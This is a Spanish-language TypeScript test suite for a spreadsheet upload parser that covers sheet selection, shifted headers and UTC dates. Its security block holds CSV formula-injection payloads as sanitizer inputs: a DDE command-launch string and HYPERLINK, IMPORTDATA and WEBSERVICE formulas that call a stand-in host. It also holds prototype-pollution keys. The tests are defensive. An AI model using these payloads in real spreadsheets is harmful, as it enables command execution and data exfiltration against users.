import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import * as XLSX from 'xlsx';
import {
  MAX_UPLOAD_FILE_BYTES,
  extractTabularDegustacionFile,
  sanitizeCellText,
  validateUploadFileMetadata,
} from '../src/utils/degustacionesTabularParser';
import {
  createSafeNullMap,
  excelDateParser,
  isDangerousObjectKey,
  normalizeExcelHeader,
} from '../src/utils/excelDateParser';
import {
  MAX_HEADER_SCAN_ROWS,
  parseSheetNameChronology,
  readMostRecentWorkbookSheet,
} from '../src/utils/excelWorkbookReader';

// Simular huso horario America/Caracas (UTC-4) para garantizar cero desfase de -1 día
process.env.TZ = 'America/Caracas';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const PROJECT_ROOT = path.resolve(__dirname, '..');

function toArrayBuffer(u8: Uint8Array): ArrayBuffer {
  const copy = new Uint8Array(u8.byteLength);
  copy.set(u8);
  return copy.buffer;
}

function buildStandardDegustacionRows(isoDate: string, clienteLabel: string) {
  return [
    ['FECHA', 'TURNO', 'CLIENTE', 'DIRECCION / ZONA', 'PRODUCTO', 'KILOS', 'FDV', 'PROMOTORA', 'OBSERVACIONES'],
    [isoDate, 'MAÑANA', clienteLabel, 'MARACAIBO NORTE', 'MORTADELA ESPECIAL', 3.5, 'CARLOS PEREZ', 'Por asignar', 'Lote verificado'],
  ];
}

async function runVerification() {
  console.log('========================================================================');
  console.log('🧪 SUITE AUTOMATIZADA: REFACTOR CARGA MULTIFORMATO (6 BLOQUES TÉCNICOS)');
  console.log('========================================================================\n');

  // ---------------------------------------------------------------------------
  // (a) Nivel 1: Selección de pestaña más reciente por nombre en español y formatos
  //     numéricos en orden arbitrario + descarte de Hidden y Portadas + Lazy Parsing
  // ---------------------------------------------------------------------------
  {
    assert.equal(
      parseSheetNameChronology('Noviembre 2026', 2026)?.month,
      11,
      'Debe reconocer mes completo en español con año'
    );
    assert.equal(
      parseSheetNameChronology('NOV 2026', 2026)?.month,
      11,
      'Debe reconocer abreviatura en mayúsculas con año'
    );
    assert.deepEqual(
      {
        year: parseSheetNameChronology('Octubre_26', 2026)?.year,
        month: parseSheetNameChronology('Octubre_26', 2026)?.month,
      },
      { year: 2026, month: 10 },
      'Debe reconocer mes con guion bajo y año corto de 2 dígitos ("Octubre_26")'
    );
    assert.deepEqual(
      {
        year: parseSheetNameChronology('Noviembre', 2026)?.year,
        month: parseSheetNameChronology('Noviembre', 2026)?.month,
      },
      { year: 2026, month: 11 },
      'Debe reconocer mes sin año explícito usando el año de referencia'
    );
    assert.equal(
      parseSheetNameChronology('25-11-2026', 2026)?.timestampUtc,
      Date.UTC(2026, 10, 25),
      'Debe reconocer DD-MM-YYYY en UTC'
    );
    assert.equal(
      parseSheetNameChronology('25/11/2026', 2026)?.timestampUtc,
      Date.UTC(2026, 10, 25),
      'Debe reconocer DD/MM/YYYY en UTC'
    );
    assert.equal(
      parseSheetNameChronology('2026-11-28', 2026)?.timestampUtc,
      Date.UTC(2026, 10, 28),
      'Debe reconocer YYYY-MM-DD en UTC'
    );
    assert.equal(
      parseSheetNameChronology('11-2026', 2026)?.month,
      11,
      'Debe reconocer MM-YYYY'
    );
    assert.equal(
      parseSheetNameChronology('2026-12', 2026)?.month,
      12,
      'Debe reconocer YYYY-MM'
    );

    // Libro multi-pestaña en orden desordenado con hoja decorativa y hoja oculta del futuro
    const wbScrambled = XLSX.utils.book_new();
    XLSX.utils.book_append_sheet(
      wbScrambled,
      XLSX.utils.aoa_to_sheet([
        ['CODIZULCA C.A. - PORTADA EJECUTIVA 2029'],
        ['Documento informativo sin columnas de degustación'],
      ]),
      'PORTADA 2029'
    );
    XLSX.utils.book_append_sheet(
      wbScrambled,
      XLSX.utils.aoa_to_sheet(buildStandardDegustacionRows('2026-09-10', 'PDV SEPTIEMBRE')),
      '09-2026'
    );
    XLSX.utils.book_append_sheet(
      wbScrambled,
      XLSX.utils.aoa_to_sheet(buildStandardDegustacionRows('2026-11-22', 'PDV GANADOR NOVIEMBRE')),
      'NOV 2026'
    );
    XLSX.utils.book_append_sheet(
      wbScrambled,
      XLSX.utils.aoa_to_sheet(buildStandardDegustacionRows('2026-10-18', 'PDV OCTUBRE')),
      'Octubre_26'
    );
    XLSX.utils.book_append_sheet(
      wbScrambled,
      XLSX.utils.aoa_to_sheet(buildStandardDegustacionRows('2026-10-05', 'PDV DIA OCTUBRE')),
      '05-10-2026'
    );
    XLSX.utils.book_append_sheet(
      wbScrambled,
      XLSX.utils.aoa_to_sheet(buildStandardDegustacionRows('2027-12-15', 'PDV OCULTO NO LEER')),
      'Diciembre 2027'
    );
    wbScrambled.Workbook = {
      Sheets: [
        { Hidden: 0 }, // PORTADA 2029 (decorativa, debe descartarse)
        { Hidden: 0 }, // 09-2026
        { Hidden: 0 }, // NOV 2026 (más reciente visible estructurada)
        { Hidden: 0 }, // Octubre_26
        { Hidden: 0 }, // 05-10-2026
        { Hidden: 1 }, // Diciembre 2027 (oculta, debe ignorarse)
      ],
    };

    const xlsxBytes = XLSX.write(wbScrambled, { type: 'buffer', bookType: 'xlsx' }) as Buffer;
    const result = await extractTabularDegustacionFile(toArrayBuffer(xlsxBytes), 'xlsx', {
      fileName: 'Planificacion_Anual_2026.xlsx',
    });

    assert.equal(result.selectedSheetName, 'NOV 2026', 'Debe elegir automáticamente "NOV 2026"');
    assert.equal(result.autoSelectedSheetName, 'NOV 2026');
    assert.equal(result.sheetSelectionReason, 'NOMBRE_PESTANA');
    assert.equal(
      result.deepParsedSheetCount,
      1,
      'Lazy Parsing: solo debe parsear en profundidad 1 hoja (la ganadora)'
    );
    assert.deepEqual(
      result.availableSheets,
      ['09-2026', 'NOV 2026', 'Octubre_26', '05-10-2026'],
      'Debe listar únicamente las hojas visibles con estructura real de degustaciones (excluyendo portada y ocultas)'
    );
    assert.equal(result.rows.length, 1);
    assert.equal(result.rows[0]?.clienteNombre, 'PDV GANADOR NOVIEMBRE');
    assert.equal(result.rows[0]?.fecha, '2026-11-22');

    // Cambio manual de pestaña desde la UI usando el mismo buffer
    const switched = await extractTabularDegustacionFile(toArrayBuffer(xlsxBytes), 'xlsx', {
      fileName: 'Planificacion_Anual_2026.xlsx',
      targetSheetName: 'Octubre_26',
    });
    assert.equal(switched.selectedSheetName, 'Octubre_26');
    assert.equal(switched.autoSelectedSheetName, 'NOV 2026');
    assert.equal(switched.sheetSelectionReason, 'MANUAL');
    assert.equal(switched.rows[0]?.clienteNombre, 'PDV OCTUBRE');

    // Libro con meses sin año en desorden: ["Noviembre", "Agosto", "Octubre"]
    const wbMonthsOnly = XLSX.utils.book_new();
    XLSX.utils.book_append_sheet(
      wbMonthsOnly,
      XLSX.utils.aoa_to_sheet(buildStandardDegustacionRows('2026-11-12', 'PDV MES NOV')),
      'Noviembre'
    );
    XLSX.utils.book_append_sheet(
      wbMonthsOnly,
      XLSX.utils.aoa_to_sheet(buildStandardDegustacionRows('2026-08-12', 'PDV MES AGO')),
      'Agosto'
    );
    XLSX.utils.book_append_sheet(
      wbMonthsOnly,
      XLSX.utils.aoa_to_sheet(buildStandardDegustacionRows('2026-10-12', 'PDV MES OCT')),
      'Octubre'
    );
    const monthsOnlyRead = readMostRecentWorkbookSheet(XLSX, wbMonthsOnly);
    assert.equal(monthsOnlyRead.selectedSheetName, 'Noviembre');
    assert.equal(monthsOnlyRead.selectionReason, 'NOMBRE_PESTANA');

    console.log(
      '✅ [a] Nivel 1 (pestaña más reciente en ES/numérico, descarte Hidden/Portada, Lazy Parsing = 1 hoja y switch manual) verificado.'
    );
  }

  // ---------------------------------------------------------------------------
  // (b) Nivel 2: Fallback por contenido interno cuando los nombres son "Hoja1", "Hoja2", "Datos"
  // ---------------------------------------------------------------------------
  {
    const wbGeneric = XLSX.utils.book_new();
    XLSX.utils.book_append_sheet(
      wbGeneric,
      XLSX.utils.aoa_to_sheet(buildStandardDegustacionRows('14/09/2026', 'CLIENTE HOJA 1')),
      'Hoja1'
    );
    XLSX.utils.book_append_sheet(
      wbGeneric,
      XLSX.utils.aoa_to_sheet([
        ['FECHA DE DEGUSTACIÓN', 'TURNO', 'CLIENTE', 'PRODUCTO', 'KILOS'],
        ['05/12/2026', 'TARDE', 'CLIENTE MAS RECIENTE HOJA 2', 'ESPALDA AHUMADA', 4],
        ['19/12/2026', 'MAÑANA', 'CLIENTE PICO DICIEMBRE HOJA 2', 'MORTADELA', 2.5],
      ]),
      'Hoja2'
    );
    XLSX.utils.book_append_sheet(
      wbGeneric,
      XLSX.utils.aoa_to_sheet(buildStandardDegustacionRows('28/10/2026', 'CLIENTE DATOS')),
      'Datos'
    );

    const genericBytes = XLSX.write(wbGeneric, { type: 'buffer', bookType: 'xlsx' }) as Buffer;
    const fallbackOut = await extractTabularDegustacionFile(toArrayBuffer(genericBytes), 'xlsx', {
      fileName: 'Reporte_Sin_Fecha_Pestana.xlsx',
    });

    assert.equal(
      fallbackOut.selectedSheetName,
      'Hoja2',
      'Fallback Nivel 2 debe elegir "Hoja2" al contener la fecha interna más reciente (19/12/2026)'
    );
    assert.equal(fallbackOut.sheetSelectionReason, 'CONTENIDO_FECHAS');
    assert.equal(fallbackOut.deepParsedSheetCount, 1);
    assert.equal(fallbackOut.rows.length, 2);
    assert.equal(fallbackOut.rows[1]?.fecha, '2026-12-19');
    assert.equal(fallbackOut.rows[1]?.clienteNombre, 'CLIENTE PICO DICIEMBRE HOJA 2');

    console.log(
      '✅ [b] Nivel 2 (fallback por fecha interna UTC más reciente en "Hoja1" / "Hoja2" / "Datos") verificado.'
    );
  }

  // ---------------------------------------------------------------------------
  // (c) Detección dinámica de encabezados desplazados dentro de las primeras 15 filas
  //     + omisión de filas vacías finales + reporte exacto de fila Excel 1-based
  // ---------------------------------------------------------------------------
  {
    assert.equal(MAX_HEADER_SCAN_ROWS, 15, 'El escaneo de encabezados debe acotarse a las primeras 15 filas');

    const headerCheck = normalizeExcelHeader('   Fecha   de   Degustación (DD/MM/AAAA)  ');
    assert.equal(headerCheck.normalizedLower, 'fecha de degustacion');
    assert.equal(headerCheck.canonicalKey, 'FECHADEGUSTACION');

    const displacedMatrix: unknown[][] = [
      ['CODIZULCA C.A. - DIRECCIÓN DE TRADE MARKETING'], // Fila 1
      ['RIF: J-00000000-0 • REGIÓN OCCIDENTE'], // Fila 2
      [], // Fila 3 vacía
      ['CRONOGRAMA OPERATIVO DE DEGUSTACIONES'], // Fila 4
      [], // Fila 5 vacía
      [
        '  Fecha   de   Degustación  ',
        '  Horario ',
        '  Punto   de  Venta ',
        ' Código ',
        ' Producto a Degustar ',
        ' Kilos ',
        ' Vendedor ',
        ' Observaciones ',
      ], // Fila 6 (dentro de las primeras 15 filas)
      [
        '15/11/2026',
        '09:00 - 13:00',
        'FIORELLA HIPERMARKET AMPARO',
        '004512', // Ceros a la izquierda preservados
        'MORTADELA ESPECIAL',
        3.25,
        'LUIS SOTO',
        'Ubicación entrada principal',
      ], // Fila 7
      [
        '31/11/2026', // Fecha calendario inválida (noviembre tiene 30 días) en Fila 8
        '14:00 - 18:00',
        'ENNE FUERZAS ARMADAS',
        '008910',
        'ESPALDA AHUMADA',
        2,
        'ANA RUIZ',
        'Prueba reporte fila exacta',
      ], // Fila 8
      ['', '', '', '', '', '', '', ''], // Fila 9 vacía
      [], // Fila 10 vacía final
    ];

    const wbDisplaced = XLSX.utils.book_new();
    XLSX.utils.book_append_sheet(
      wbDisplaced,
      XLSX.utils.aoa_to_sheet(displacedMatrix),
      'Noviembre 2026'
    );
    const displacedBytes = XLSX.write(wbDisplaced, { type: 'buffer', bookType: 'xlsx' }) as Buffer;
    const displacedOut = await extractTabularDegustacionFile(toArrayBuffer(displacedBytes), 'xlsx');

    assert.equal(
      displacedOut.rows.length,
      2,
      'Debe extraer exactamente las 2 filas reales y omitir títulos superiores y filas vacías finales'
    );
    assert.equal(displacedOut.rows[0]?.excelRowNumber, 7, 'Debe conservar fila Excel exacta #7');
    assert.equal(displacedOut.rows[0]?.fecha, '2026-11-15');
    assert.equal(displacedOut.rows[0]?.clienteCodigo, '004512', 'Debe preservar ceros a la izquierda en códigos');
    assert.equal(displacedOut.rows[0]?.cantidadKilos, 3.25);
    assert.equal(displacedOut.rows[0]?.observaciones, 'Ubicación entrada principal');

    assert.equal(displacedOut.rows[1]?.excelRowNumber, 8, 'Debe conservar fila Excel exacta #8');
    assert.equal(displacedOut.rows[1]?.fecha, '', '31/11/2026 debe marcarse inválida');
    assert.ok(
      displacedOut.rows[1]?.fechaErrorDetalle?.includes('Fila Excel #8'),
      `El error de fecha debe citar "Fila Excel #8", recibido: ${displacedOut.rows[1]?.fechaErrorDetalle}`
    );

    console.log(
      '✅ [c] Detección de encabezados desplazados (<= 15 filas), ceros en códigos, omisión de vacías y Fila Excel # exacta verificados.'
    );
  }

  // ---------------------------------------------------------------------------
  // (d) Exactitud 100% UTC en zona horaria UTC-4 (America/Caracas) sin desfase de -1 día
  // ---------------------------------------------------------------------------
  {
    // Serial Excel entero y decimal con hora para 2026-11-05 (compensando epoch 25569)
    const expectedUtcMs = Date.UTC(2026, 10, 5);
    const excelSerialInt = Math.round((expectedUtcMs - Date.UTC(1899, 11, 30)) / 86_400_000);
    const excelSerialWithFraction = excelSerialInt + 0.02; // 00:28 UTC -> en UTC-4 local sería día 04 a las 20:28 si hubiera bug de TZ

    const pInt = excelDateParser(excelSerialInt);
    const pFrac = excelDateParser(excelSerialWithFraction);
    assert.equal(pInt.isoDate, '2026-11-05', 'Serial entero no debe restar 1 día en UTC-4');
    assert.equal(pFrac.isoDate, '2026-11-05', 'Serial con fracción horaria temprana no debe restar 1 día en UTC-4');

    // Sistema Mac 1904 (date1904: true)
    const macSerial = excelSerialInt - 1462;
    assert.equal(
      excelDateParser(macSerial, { date1904: true }).isoDate,
      '2026-11-05',
      'Serial date1904 debe compensarse exactamente en UTC'
    );

    // Formatos texto regionales e ISO + instancia Date UTC
    assert.equal(excelDateParser('05/11/2026').isoDate, '2026-11-05');
    assert.equal(excelDateParser('05-11-2026').isoDate, '2026-11-05');
    assert.equal(excelDateParser('2026-11-05').isoDate, '2026-11-05');
    assert.equal(excelDateParser(new Date(Date.UTC(2026, 10, 5, 0, 0, 0))).isoDate, '2026-11-05');

    // Rechazo de fechas calendario imposibles
    assert.equal(excelDateParser('29/02/2026').ok, false, '2026 no es bisiesto');
    assert.equal(excelDateParser('29/02/2028').isoDate, '2028-02-29', '2028 sí es bisiesto');

    console.log(
      '✅ [d] Exactitud de fechas en UTC puro bajo TZ=America/Caracas (UTC-4) sin desfase de -1 día verificada.'
    );
  }

  // ---------------------------------------------------------------------------
  // (e) Bloqueo de Formula Injection, Prototype Pollution, límites anti-DoS y
  //     auditoría estática de eliminación total del aviso/DDL SQL en el frontend
  // ---------------------------------------------------------------------------
  {
    // Formula Injection (=, +, -, @, \t, \r)
    assert.equal(sanitizeCellText('=CMD|\' /C calc\'!A0'), 'CMD|\' /C calc\'!A0');
    assert.equal(sanitizeCellText('+SUM(A1:A10)'), 'SUM(A1:A10)');
    assert.equal(sanitizeCellText('-1+2+HYPERLINK("https://evil.test")'), '1+2+HYPERLINK("https://evil.test")');
    assert.equal(sanitizeCellText('@IMPORTDATA("https://evil.test/x.csv")'), 'IMPORTDATA("https://evil.test/x.csv")');
    assert.equal(sanitizeCellText('\t=WEBSERVICE("https://evil.test")'), 'WEBSERVICE("https://evil.test")');
    assert.equal(sanitizeCellText('\r@SUM(1,2)'), 'SUM(1,2)');

    // Preservación de negativos legítimos y fechas válidas
    assert.equal(sanitizeCellText('-3.5'), '-3.5');
    assert.equal(sanitizeCellText('2026-10-15'), '2026-10-15');

    // Prototype Pollution
    assert.equal(isDangerousObjectKey('__proto__'), true);
    assert.equal(isDangerousObjectKey('constructor'), true);
    assert.equal(isDangerousObjectKey('prototype'), true);
    const safeMap = createSafeNullMap<string>([
      ['__proto__', 'malicious'],
      ['constructor', 'malicious'],
      ['prototype', 'malicious'],
      ['clienteNombre', 'FIORELLA'],
    ]);
    assert.equal(Object.getPrototypeOf(safeMap), null);
    assert.equal('__proto__' in safeMap, false);
    assert.equal(safeMap.clienteNombre, 'FIORELLA');

    // Límites anti-DoS (10 MB)
    assert.equal(MAX_UPLOAD_FILE_BYTES, 10 * 1024 * 1024);
    assert.equal(
      validateUploadFileMetadata({
        name: 'Excesivo.xlsx',
        size: MAX_UPLOAD_FILE_BYTES + 1,
        type: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
      }).valid,
      false
    );

    // Auditoría estática de código cliente: cero SQL DDL embebido, cero aviso de migración y cero dangerouslySetInnerHTML
    const modalSource = fs.readFileSync(
      path.join(PROJECT_ROOT, 'src', 'components', 'field', 'MultiFormatTastingUploadModal.tsx'),
      'utf8'
    );
    const serviceSource = fs.readFileSync(
      path.join(PROJECT_ROOT, 'src', 'services', 'degustacionesPipelineService.ts'),
      'utf8'
    );

    const forbiddenPatterns = [
      '20261111_fase1_flujo_degustaciones_rutas.sql',
      'Migración SQL de Fase 1 pendiente',
      'MIGRACIÓN SQL DE FASE 1 PENDIENTE',
      'Copiar SQL Fase 1',
      'PipelineMigrationMissingError',
      'dangerouslySetInnerHTML',
    ];

    for (const pattern of forbiddenPatterns) {
      assert.equal(
        modalSource.includes(pattern),
        false,
        `MultiFormatTastingUploadModal.tsx NO debe contener "${pattern}"`
      );
      assert.equal(
        serviceSource.includes(pattern),
        false,
        `degustacionesPipelineService.ts NO debe contener "${pattern}"`
      );
    }

    assert.equal(
      serviceSource.includes('getSupabaseCoordinatorClient'),
      true,
      'degustacionesPipelineService.ts debe utilizar el cliente parametrizado oficial @supabase/supabase-js'
    );

    console.log(
      '✅ [e] Bloqueo de Formula Injection, Anti-Prototype Pollution, límites DoS, SDK parametrizado y ausencia total de SQL DDL en cliente verificados.'
    );
  }

  console.log('\n========================================================================');
  console.log('🎉 TODOS LOS CASOS DE PRUEBA (a, b, c, d, e) PASARON CON 0 ERRORES.');
  console.log('========================================================================');
}

runVerification().catch((err) => {
  console.error('❌ Falló la verificación de Carga Multiformato:', err);
  process.exit(1);
});
